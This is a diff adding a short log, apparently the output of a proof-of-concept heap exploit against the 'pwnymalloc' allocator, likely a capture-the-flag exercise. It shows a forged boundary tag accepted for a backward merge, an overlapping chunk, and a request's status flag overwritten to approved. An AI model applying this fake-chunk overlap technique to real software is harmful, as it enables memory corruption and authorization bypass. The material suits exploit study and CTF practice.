@@ -1,0 +1,8 @@
+[poc] base=0x5f1291ea1000 rr0=0x5f1291ea1008 rr1=0x5f1291ea1098 complaint=0x5f1291ea1128
+[poc] variante=adaptado header_falso=0x5f1291ea1070 size=0xb0 prev_size=0xb0
+[poc] esperado_merge=0x100
+[pwnymalloc] btag aceito: prev_size=176 candidato=0x5f1291ea1070
+Block size: 256
+[pwnymalloc] btag rejeitado: prev_size=0 candidato=0x5f1291ea1100 motivo=tamanho zero
+[poc] novo_chunk=0x5f1291ea1070 overlap=sim offset_status=24 status_rr1=1
+RESULTADO: overlap=sim status_aprovado=sim
